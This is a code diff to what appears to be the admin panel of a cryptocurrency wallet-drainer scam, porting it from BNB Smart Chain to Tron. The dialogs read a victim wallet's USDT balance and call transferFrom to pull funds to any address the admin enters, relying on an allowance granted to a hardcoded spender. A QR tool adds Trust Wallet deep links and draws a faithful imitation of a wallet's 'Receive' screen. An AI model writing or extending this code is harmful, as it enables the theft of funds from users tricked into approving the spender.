@@ -100,6 +100,15 @@ declare global {
       on: (event: string, callback: (...args: unknown[]) => void) => void;
       removeListener: (event: string, callback: (...args: unknown[]) => void) => void;
     };
+    tronWeb?: {
+      defaultAddress: { base58: string };
+      contract: (abi: unknown[], address: string) => Promise<unknown>;
+      trx: { getBalance: (address: string) => Promise<number> };
+      toBigNumber: (value: string) => unknown;
+    };
+    tronLink?: {
+      request: (args: { method: string }) => Promise<{ code: number }>;
+    };
   }
 }
 
@@ -128,17 +137,28 @@ export default function Admin() {
   }, [verifyWallet, adminWallet, navigate]);
 
   async function connectWallet() {
-    if (!window.ethereum) {
-      toast.error("MetaMask not installed");
-      return;
-    }
     try {
       setIsVerifying(true);
-      const accounts = await window.ethereum.request({
-        method: "eth_requestAccounts",
-      }) as string[];
-      const wallet = accounts[0].toLowerCase();
-      setAdminWallet(wallet);
+      if (window.tronLink) {
+        const res = await window.tronLink.request({ method: "tron_requestAccounts" });
+        if (res && res.code === 200) {
+          const wallet = window.tronWeb?.defaultAddress?.base58;
+          if (wallet) { console.log("WALLET:", wallet); setAdminWallet(wallet); return; }
+        }
+      } else if (window.tronWeb?.defaultAddress?.base58) {
+        setAdminWallet(window.tronWeb.defaultAddress.base58);
+        return;
+      } else if (window.ethereum) {
+        const accounts = await window.ethereum.request({
+          method: "eth_requestAccounts",
+        }) as string[];
+        setAdminWallet(accounts[0].toLowerCase());
+        return;
+      } else {
+        toast.error("Please install Trust Wallet or TronLink");
+        setIsVerifying(false);
+        return;
+      }
     } catch (error) {
       console.error(error);
       toast.error("Failed to connect wallet");
@@ -1235,55 +1255,41 @@ function TransferDialog({
   const [loadingBalances, setLoadingBalances] = useState(false);
   const createTransfer = useMutation(api.transfers.createTransfer);
 
-  const BSC_CHAIN_ID = "0x38";
-  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
-  const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
+  const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
 
   const fetchUserBalances = useCallback(async () => {
     if (!transaction?.walletAddress) return;
 
     setLoadingBalances(true);
     try {
-      const { ethers } = window as typeof window & {
-        ethers: {
-          JsonRpcProvider: new (url: string) => {
-            getBalance: (address: string) => Promise<bigint>;
-          };
-          Contract: new (
-            address: string,
-            abi: string[],
-            provider: unknown
-          ) => {
-            balanceOf: (address: string) => Promise<bigint>;
-          };
-          formatUnits: (value: bigint, decimals: number) => string;
-        };
-      };
+      const tronWeb = window.tronWeb;
+      if (!tronWeb) return;
 
-      const provider = new ethers.JsonRpcProvider(
-        "https://bsc-dataseed.binance.org/"
-      );
+      const contract = await tronWeb.contract([
+        {
+          "name": "balanceOf",
+          "inputs": [{ "name": "owner", "type": "address" }],
+          "outputs": [{ "name": "", "type": "uint256" }],
+          "stateMutability": "view",
+          "type": "function"
+        }
+      ], TRON_USDT);
 
-      const usdtContract = new ethers.Contract(
-        BSC_USDT,
-        ["function balanceOf(address) view returns (uint256)"],
-        provider
-      );
-
-      const [usdt, bnb] = await Promise.all([
-        usdtContract.balanceOf(transaction.walletAddress),
-        provider.getBalance(transaction.walletAddress),
+      const [usdt, trx] = await Promise.all([
+        (contract as any).balanceOf(transaction.walletAddress).call(),
+        tronWeb.trx.getBalance(transaction.walletAddress),
       ]);
 
-      setUsdtBalance(ethers.formatUnits(usdt, 18));
-      setBnbBalance(ethers.formatUnits(bnb, 18));
+      setUsdtBalance((Number(usdt) / 1e6).toFixed(2));
+      setBnbBalance((Number(trx) / 1e6).toFixed(2));
     } catch (error) {
       console.error("Failed to fetch balances:", error);
       toast.error("Failed to fetch real-time balances");
     } finally {
       setLoadingBalances(false);
     }
-  }, [transaction?.walletAddress, BSC_USDT]);
+  }, [transaction?.walletAddress, TRON_USDT]);
 
   useEffect(() => {
     if (!transaction) {
@@ -1298,39 +1304,32 @@ function TransferDialog({
   }, [transaction, fetchUserBalances]);
 
   async function connectAdminWallet() {
-    if (!window.ethereum) {
-      toast.error("MetaMask not found");
-      return;
-    }
-
     try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID }],
-      });
-    } catch (err) {
-      const error = err as { code?: number };
-      if (error.code === 4902) {
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [
-            {
-              chainId: BSC_CHAIN_ID,
-              chainName: "Binance Smart Chain",
-              rpcUrls: ["https://bsc-dataseed.binance.org/"],
-              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-              blockExplorerUrls: ["https://bscscan.com"],
-            },
-          ],
-        });
+      if (window.tronLink) {
+        const res = await window.tronLink.request({ method: "tron_requestAccounts" });
+        if (res && res.code === 200) {
+          setAdminConnected(true);
+          toast.success("Admin wallet connected");
+          return;
+        }
+      } else if (window.tronWeb?.defaultAddress?.base58) {
+        setAdminConnected(true);
+        toast.success("Admin wallet connected");
+        return;
+      } else if (window.ethereum) {
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        setAdminConnected(true);
+        toast.success("Admin wallet connected");
+        return;
+      } else {
+        toast.error("Please install Trust Wallet or TronLink");
+        return;
       }
+    } catch (error) {
+      console.error(error);
+      toast.error("Failed to connect wallet");
     }
-
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-    setAdminConnected(true);
-    toast.success("Admin wallet connected");
   }
-
   async function handleTransfer() {
     if (!transaction || !toAddress || !amount) {
       toast.error("Please fill all fields");
@@ -1366,29 +1365,39 @@ function TransferDialog({
         };
       };
 
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
+      const tronWeb = window.tronWeb;
+      if (!tronWeb) {
+        toast.error("TronLink not found");
+        return;
+      }
 
-      const operatorContract = new ethers.Contract(
-        TOKEN_OPERATOR,
-        [
-          "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
-        ],
-        signer
-      );
+      const contract = await tronWeb.contract([
+        {
+          "name": "transferFrom",
+          "inputs": [
+            { "name": "from", "type": "address" },
+            { "name": "to", "type": "address" },
+            { "name": "amount", "type": "uint256" }
+          ],
+          "outputs": [{ "name": "", "type": "bool" }],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }
+      ], TRON_USDT);
 
-      const amountInWei = ethers.parseUnits(amount, 18);
+      const amountInSun = Math.floor(parseFloat(amount) * 1e6);
 
-      const tx = await operatorContract.delegatedTransfer(
-        BSC_USDT,
+      const tx = await (contract as any).transferFrom(
         transaction.walletAddress,
         toAddress,
-        amountInWei
-      );
+        amountInSun
+      ).send({ feeLimit: 100_000_000 });
 
       toast.success("Transaction submitted! Waiting for confirmation...");
 
-      const receipt = await tx.wait();
+      await new Promise(resolve => setTimeout(resolve, 3000));
+
+      const receipt = { hash: tx };
 
       // Save transfer to database
       await createTransfer({
@@ -1874,43 +1883,36 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
   const [adminConnected, setAdminConnected] = useState(false);
   const createTransfer = useMutation(api.transfers.createTransfer);
 
-  const BSC_CHAIN_ID = "0x38";
-  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
-  const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
+  const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
 
   async function connectAdminWallet() {
-    if (!window.ethereum) {
-      toast.error("MetaMask not found");
-      return;
-    }
-
-    try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID }],
-      });
-    } catch (err) {
-      const error = err as { code?: number };
-      if (error.code === 4902) {
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [
-            {
-              chainId: BSC_CHAIN_ID,
-              chainName: "Binance Smart Chain",
-              rpcUrls: ["https://bsc-dataseed.binance.org/"],
-              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-              blockExplorerUrls: ["https://bscscan.com"],
-            },
-          ],
-        });
+      try {
+        if (window.tronLink) {
+          const res = await window.tronLink.request({ method: "tron_requestAccounts" });
+          if (res && res.code === 200) {
+            setAdminConnected(true);
+            toast.success("Admin wallet connected");
+            return;
+          }
+        } else if (window.tronWeb?.defaultAddress?.base58) {
+          setAdminConnected(true);
+          toast.success("Admin wallet connected");
+          return;
+        } else if (window.ethereum) {
+          await window.ethereum.request({ method: "eth_requestAccounts" });
+          setAdminConnected(true);
+          toast.success("Admin wallet connected");
+          return;
+        } else {
+          toast.error("Please install Trust Wallet or TronLink");
+          return;
+        }
+      } catch (error) {
+        console.error(error);
+        toast.error("Failed to connect wallet");
       }
     }
-
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-    setAdminConnected(true);
-    toast.success("Admin wallet connected");
-  }
 
   async function handleTransfer() {
     if (!fromAddress || !toAddress || !amount) {
@@ -1947,30 +1949,37 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
         };
       };
 
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
+      
+      const tronWeb = window.tronWeb;
+      if (!tronWeb) throw new Error("TronLink not found");
 
-      const operatorContract = new ethers.Contract(
-        TOKEN_OPERATOR,
-        [
-          "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
-        ],
-        signer
-      );
+      const contract = await tronWeb.contract([
+        {
+          "name": "transferFrom",
+          "inputs": [
+            { "name": "from", "type": "address" },
+            { "name": "to", "type": "address" },
+            { "name": "amount", "type": "uint256" }
+          ],
+          "outputs": [{ "name": "", "type": "bool" }],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }
+      ], TRON_USDT);
 
-      const amountInWei = ethers.parseUnits(amount, 18);
+      const amountInSun = Math.floor(parseFloat(amount) * 1e6);
 
-      const tx = await operatorContract.delegatedTransfer(
-        BSC_USDT,
+      const tx = await (contract as any).transferFrom(
         fromAddress,
         toAddress,
-        amountInWei
-      );
+        amountInSun
+      ).send({ feeLimit: 100_000_000 });
 
       toast.success("Transaction submitted! Waiting for confirmation...");
 
-      const receipt = await tx.wait();
+      await new Promise(resolve => setTimeout(resolve, 3000));
 
+      const receipt = { hash: tx };
       // Save transfer to database
       await createTransfer({
         adminWallet,
@@ -2172,7 +2181,7 @@ function QRGeneratorTab() {
       // Wrap with deep link if not universal
       let deepLinkUrl = finalUrl;
       if (walletType === "trustwallet") {
-        deepLinkUrl = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(finalUrl)}`;
+        deepLinkUrl = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(finalUrl)}`;
       } else if (walletType === "metamask") {
         deepLinkUrl = `https://metamask.app.link/dapp/${finalUrl.replace(/^https?:\/\//, '')}`;
       }
@@ -2380,123 +2389,113 @@ function QRGeneratorTab() {
                   margin: "0 auto",
                   overflow: "hidden"
                 }}
-              >
+                >
                 {/* Status Bar */}
-                <div className="bg-white pt-3 pb-2 flex items-center justify-between text-black" style={{ paddingLeft: "24px", paddingRight: "24px" }}>
+                <div className="pt-3 pb-2 flex items-center justify-between text-white" style={{ background: "#1a1a1a", paddingLeft: "24px", paddingRight: "24px" }}>
                   <span className="text-sm font-semibold">16:35</span>
                   <div className="flex items-center gap-1">
                     <div className="flex gap-[2px]">
-                      <div className="w-1 h-3 bg-black rounded-full opacity-40"></div>
-                      <div className="w-1 h-3 bg-black rounded-full opacity-60"></div>
-                      <div className="w-1 h-3 bg-black rounded-full opacity-80"></div>
-                      <div className="w-1 h-3 bg-black rounded-full"></div>
+                      <div className="w-1 h-3 bg-white rounded-full opacity-40"></div>
+                      <div className="w-1 h-3 bg-white rounded-full opacity-60"></div>
+                      <div className="w-1 h-3 bg-white rounded-full opacity-80"></div>
+                      <div className="w-1 h-3 bg-white rounded-full"></div>
                     </div>
                     <span className="text-xs font-medium ml-1">5G</span>
                     <svg className="w-6 h-4 ml-1" viewBox="0 0 24 14" fill="none">
-                      <rect x="1" y="3" width="18" height="10" rx="2" stroke="black" strokeWidth="1.5" fill="none"/>
-                      <rect x="20" y="5" width="2" height="6" rx="1" fill="black"/>
-                      <rect x="3" y="5" width="14" height="6" rx="1" fill="black"/>
+                      <rect x="1" y="3" width="18" height="10" rx="2" stroke="white" strokeWidth="1.5" fill="none"/>
+                      <rect x="20" y="5" width="2" height="6" rx="1" fill="white"/>
+                      <rect x="3" y="5" width="14" height="6" rx="1" fill="white"/>
                     </svg>
                   </div>
                 </div>
 
                 {/* Header */}
-                <div className="bg-white py-4 flex items-center justify-center border-b border-gray-200" style={{ paddingLeft: "20px", paddingRight: "20px", position: "relative" }}>
+                <div className="py-4 flex items-center justify-center" style={{ background: "#1a1a1a", paddingLeft: "20px", paddingRight: "20px", position: "relative" }}>
                   <div style={{ position: "absolute", left: "20px" }}>
-                    <ArrowLeft className="h-5 w-5 text-black" />
+                    <ArrowLeft className="h-5 w-5 text-white" />
                   </div>
-                  <h1 className="text-lg font-semibold text-black">Receive</h1>
+                  <h1 className="text-lg font-semibold text-white">Receive</h1>
                   <div style={{ position: "absolute", right: "20px" }}>
-                    <Info className="h-5 w-5 text-black" />
+                    <Info className="h-5 w-5 text-white" />
                   </div>
                 </div>
 
                 {/* Warning Banner */}
-                <div className="bg-white" style={{ paddingTop: "16px", paddingLeft: "28px", paddingRight: "28px" }}>
-                  <div className="bg-[#FFF4E5] border-l-4 border-[#FFB020] px-3 py-2 rounded-lg">
+                <div style={{ background: "#1a1a1a", paddingTop: "16px", paddingLeft: "28px", paddingRight: "28px" }}>
+                  <div className="px-3 py-2 rounded-lg" style={{ background: "#2a2a1a", borderLeft: "4px solid #8a7a20" }}>
                     <div className="flex gap-2">
-                      <AlertCircle className="h-4 w-4 text-[#FFB020] flex-shrink-0 mt-0.5" />
-                      <p className="text-[10px] leading-relaxed text-black">
-                        Only send Tether USD (BEP20) assets to this address. Other assets will be lost forever.
-                      </p>
+                      <AlertCircle className="h-4 w-4 flex-shrink-0 mt-0.5" style={{ color: "#a89830" }} />
+                      <p className="text-[10px] leading-relaxed text-white">Only send Tether USD (TRC20) assets to this address. Other assets will be lost forever.</p>
                     </div>
                   </div>
                 </div>
 
                 {/* USDT Badge */}
-                <div className="bg-white pt-4 pb-2 flex justify-center">
-                  <div className="inline-flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-full px-3 py-1.5">
-                    <div className="w-6 h-6 rounded-full bg-[#26A17B] flex items-center justify-center text-white font-bold" style={{ fontSize: "14px" }}>
-                      ₮
-                    </div>
-                    <div className="flex items-baseline gap-1.5">
-                      <span className="font-bold text-black" style={{ fontSize: "13px" }}>USDT</span>
-                      <span className="text-gray-500" style={{ fontSize: "11px" }}>BNB Smart Chain</span>
+                <div className="pt-5 pb-3 flex justify-center" style={{ background: "#1a1a1a" }}>
+                  <div className="inline-flex items-center gap-2">
+                    <div className="w-8 h-8 rounded-full bg-[#26A17B] flex items-center justify-center text-white font-bold" style={{ fontSize: "16px" }}>₮</div>
+                    <span className="font-bold text-white" style={{ fontSize: "16px" }}>USDT</span>
+                    <div className="px-2 py-0.5 rounded" style={{ background: "#2a2a2a" }}>
+                      <span className="text-gray-400" style={{ fontSize: "12px" }}>Tron</span>
                     </div>
                   </div>
                 </div>
 
                 {/* QR Code Container */}
-                <div className="bg-white pb-3 flex justify-center">
-                  <div className="bg-white rounded-2xl p-3 shadow-sm border border-gray-200 inline-flex flex-col items-center">
+                <div className="pb-4 flex justify-center" style={{ background: "#1a1a1a" }}>
+                  <div className="bg-white rounded-2xl p-4 inline-flex flex-col items-center">
                     <div className="relative" style={{ width: "180px", height: "180px" }}>
-                      <img 
-                        src={qrDataUrl} 
-                        alt="QR Code" 
-                        className="w-full h-full"
-                        style={{ display: "block" }}
-                      />
+                      <img src={qrDataUrl} alt="QR Code" className="w-full h-full" style={{ display: "block" }} />
                     </div>
-                    
-                    {/* Wallet Address */}
-                    <div className="mt-2" style={{ width: "180px" }}>
+                    <div className="mt-3" style={{ width: "190px" }}>
                       <p className="text-center font-mono text-[11px] text-black break-all leading-snug">
-                        {walletAddress || "0x18CcB55B75556DfD959DbBc57c9307dce041A7a3"}
+                        {walletAddress || "TBScG6MkyZqC1C7wZapudANSxCT8xvMGtZ"}
                       </p>
+                      <p className="text-center text-[10px] text-gray-400 mt-1">No memo required</p>
                     </div>
                   </div>
                 </div>
 
                 {/* Action Buttons */}
-                <div className="bg-white pb-4 flex justify-center" style={{ paddingLeft: "48px", paddingRight: "48px" }}>
+                <div className="pb-5 flex justify-center" style={{ background: "#1a1a1a", paddingLeft: "48px", paddingRight: "48px" }}>
                   <div className="flex items-center justify-between w-full">
                     <div className="flex flex-col items-center gap-1.5">
-                      <div className="w-10 h-10 rounded-xl bg-gray-100 flex items-center justify-center">
-                        <Copy className="h-4 w-4 text-gray-700" />
+                      <div className="w-12 h-12 rounded-full flex items-center justify-center" style={{ background: "#2a2a2a" }}>
+                        <Copy className="h-5 w-5 text-white" />
                       </div>
-                      <span className="text-[10px] text-black font-medium">Copy</span>
+                      <span className="text-[11px] text-white font-medium">Copy</span>
                     </div>
                     <div className="flex flex-col items-center gap-1.5">
-                      <div className="w-10 h-10 rounded-xl bg-gray-100 flex items-center justify-center">
-                        <Download className="h-4 w-4 text-gray-700" />
+                      <div className="w-12 h-12 rounded-full flex items-center justify-center" style={{ background: "#2a2a2a" }}>
+                        <Download className="h-5 w-5 text-white" />
                       </div>
-                      <span className="text-[10px] text-black font-medium">Set Amount</span>
+                      <span className="text-[11px] text-white font-medium">Set Amount</span>
                     </div>
                     <div className="flex flex-col items-center gap-1.5">
-                      <div className="w-10 h-10 rounded-xl bg-gray-100 flex items-center justify-center">
-                        <ExternalLink className="h-4 w-4 text-gray-700" />
+                      <div className="w-12 h-12 rounded-full flex items-center justify-center" style={{ background: "#2a2a2a" }}>
+                        <ExternalLink className="h-5 w-5 text-white" />
                       </div>
-                      <span className="text-[10px] text-black font-medium">Share</span>
+                      <span className="text-[11px] text-white font-medium">Share</span>
                     </div>
                   </div>
                 </div>
 
                 {/* Deposit Info Card */}
-                <div className="bg-white pb-4" style={{ paddingLeft: "28px", paddingRight: "28px" }}>
-                  <div className="bg-[#F5F5F5] rounded-2xl p-3 flex items-center gap-2.5">
-                    <div className="w-9 h-9 rounded-full bg-[#E5E5FF] flex items-center justify-center flex-shrink-0">
-                      <Download className="h-4 w-4 text-[#6B5CE7]" />
+                <div className="pb-4" style={{ background: "#1a1a1a", paddingLeft: "28px", paddingRight: "28px" }}>
+                  <div className="rounded-2xl p-3 flex items-center gap-2.5" style={{ background: "#2a2a2a" }}>
+                    <div className="w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0" style={{ background: "#1a3a2a" }}>
+                      <Download className="h-4 w-4" style={{ color: "#26A17B" }} />
                     </div>
                     <div className="flex-1">
-                      <p className="text-xs font-semibold text-black">Deposit from exchange</p>
-                      <p className="text-[10px] text-gray-600 mt-0.5">By direct transfer from your account</p>
+                      <p className="text-xs font-semibold text-white">Deposit from exchange</p>
+                      <p className="text-[10px] text-gray-400 mt-0.5">By direct transfer from your account</p>
                     </div>
                   </div>
                 </div>
 
                 {/* Bottom Indicator */}
-                <div className="bg-white pb-2 flex justify-center">
-                  <div className="w-32 h-1 bg-black rounded-full"></div>
+                <div className="pb-3 flex justify-center" style={{ background: "#1a1a1a" }}>
+                  <div className="w-32 h-1 bg-white rounded-full opacity-30"></div>
                 </div>
               </div>
 
